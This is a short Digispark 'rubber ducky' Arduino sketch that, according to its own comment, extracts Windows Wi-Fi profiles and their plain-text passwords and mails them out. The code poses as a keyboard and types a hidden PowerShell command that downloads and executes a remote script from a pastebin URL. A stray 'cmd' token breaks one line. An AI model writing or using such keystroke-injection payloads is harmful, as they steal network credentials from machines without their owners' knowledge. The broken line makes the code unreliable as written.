//A Digispark rubber ducky script for Windows to Extract and Mail Wifi profiles (SSID, password) in plain text format.

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}


void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();


  
    // --> Obfuscate the command prompt
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press('d');
  delay(800);
  Keyboard.releaseAll();
  delay(800);    
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');cmd
  delay(400);
  
  Keyboard.print(F("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/isrksvp0');\""));
  delay(800);
  typeKey(KEY_RETURN);


}

void loop() {          
}
